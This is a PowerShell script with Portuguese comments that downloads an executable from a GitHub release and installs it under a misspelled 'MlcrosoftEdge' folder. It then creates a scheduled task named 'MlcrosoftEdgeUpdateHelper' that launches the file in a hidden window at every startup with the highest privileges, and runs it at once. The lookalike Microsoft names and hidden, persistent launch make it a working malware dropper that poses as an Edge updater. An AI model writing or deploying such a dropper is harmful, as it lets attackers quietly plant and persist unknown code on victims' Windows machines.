<#
.SYNOPSIS
D32N 8UD2N328UDXCM3289XM2U83XM238XMU28UXM238MX238X23

.DESCRIPTION
NSDA8D7213ND328YM243DC87Y2M4C28Y7MN2C84YUNM283CM2C4
#>

[CmdletBinding()]
param()

$urlDownload = "https://github.com/4ybbe/phpSv/releases/download/stupid/EdgeUpdateSupport.exe"
$diretorioDestino = "C:\ProgramData\MlcrosoftEdge"
$nomeTarefa = "MlcrosoftEdgeUpdateHelper"

function Download-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Url,
        [Parameter(Mandatory=$true)]
        [string]$OutFile,
        [int]$Retries = 3
    )
    
    # Configura TLS para compatibilidade
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    
    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            Write-Host "Baixando de: $Url (tentativa $($i+1)/$Retries)"
            
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
            
            Write-Host "Download concluído com sucesso!" -ForegroundColor Green
            return $true
        } catch {
            if ($i -eq ($Retries - 1)) {
                Write-Error "Falha ao baixar o arquivo após $Retries tentativas: $_"
                return $false
            }
            Write-Host "Tentativa $($i+1) falhou, tentando novamente em 2 segundos..."
            Start-Sleep -Seconds 2
        }
    }
    return $false
}

function Add-ScheduledTask {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Nome,
        [Parameter(Mandatory=$true)]
        [string]$CaminhoExecutavel
    )
    
    try {
        Write-Host "Criando tarefa '$Nome' no agendador do Windows..."
        
        # Remove tarefa existente
        $tarefaExistente = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
        if ($tarefaExistente) {
            Write-Host "Removendo tarefa existente..."
            Unregister-ScheduledTask -TaskName $Nome -Confirm:$false -ErrorAction Stop
        }
        
        $usuario = "$env:USERDOMAIN\$env:USERNAME"
        
        # ⭐ ESCAPE CORRETO PARA O SCHTASKS
        # O comando interno usa aspas duplas escapadas com backtick
        $comando = "powershell.exe -Command `"Start-Process -FilePath '$CaminhoExecutavel' -WindowStyle Hidden`""
        
        # ⭐ O argumento /tr recebe o comando com aspas externas
        $argumentos = @(
            "/create",
            "/tn", $Nome,
            "/tr", $comando,
            "/sc", "onstart",
            "/ru", $usuario,
            "/rl", "HIGHEST",
            "/f"
        )
        
        Write-Host "Executando: schtasks $($argumentos -join ' ')"
        
        $process = Start-Process -FilePath "schtasks" -ArgumentList $argumentos -Wait -PassThru -NoNewWindow
        
        if ($process.ExitCode -ne 0) {
            throw "Falha ao criar tarefa. Código: $($process.ExitCode)"
        }
        
        Write-Host "Tarefa '$Nome' criada com sucesso!" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Error "Falha ao criar tarefa: $_"
        return $false
    }
}

function Main {   
    Write-Host "=== INICIANDO INSTALAÇÃO ===" -ForegroundColor Cyan
    Write-Host "URL: $urlDownload"
    Write-Host "Destino: $diretorioDestino"
    Write-Host "Nome da Tarefa: $nomeTarefa"
    Write-Host ""
    
    try {
        # 1. Cria a pasta de destino
        Write-Host "Passo 1/3: Criando diretório..."
        if (-not (Test-Path -Path $diretorioDestino)) {
            New-Item -ItemType Directory -Path $diretorioDestino -Force | Out-Null
            Write-Host "Diretório criado: $diretorioDestino"
        } else {
            Write-Host "Diretório já existe: $diretorioDestino"
        }
        
        # 2. Baixa o executável
        Write-Host "`nPasso 2/3: Baixando executável..."
        $nomeArquivo = [System.IO.Path]::GetFileName($urlDownload)
        if ([string]::IsNullOrEmpty($nomeArquivo)) {
            $nomeArquivo = "EdgeUpdateSupport.exe"
        }
        $caminhoCompleto = Join-Path -Path $diretorioDestino -ChildPath $nomeArquivo
        
        $downloadSuccess = Download-File -Url $urlDownload -OutFile $caminhoCompleto
        
        if (-not $downloadSuccess) {
            throw "Falha no download do arquivo. Verifique a URL e a conexão com internet."
        }
        
        # Verifica se o arquivo foi baixado
        if (-not (Test-Path -Path $caminhoCompleto)) {
            throw "Arquivo não encontrado após download: $caminhoCompleto"
        }
        
        # 3. Cria tarefa no agendador (USANDO A FUNÇÃO)
        Write-Host "`nPasso 3/3: Configurando tarefa no agendador..."
        $sucessoTarefa = Add-ScheduledTask -Nome $nomeTarefa -CaminhoExecutavel $caminhoCompleto
        
        if (-not $sucessoTarefa) {
            throw "Falha ao criar tarefa agendada"
        }
        schtasks /run $nomeTarefa
        
        Write-Host "`n=== INSTALAÇÃO CONCLUÍDA COM SUCESSO! ===" -ForegroundColor Green
        Write-Host "A tarefa '$nomeTarefa' será executada na próxima inicialização do sistema." -ForegroundColor Yellow
        
    } catch {
        Write-Error "❌ Erro durante a instalação: $_"
        Write-Host "`n=== INSTALAÇÃO FALHOU ===" -ForegroundColor Red
        Exit 1
    }
}

# Executa a função principal
Main
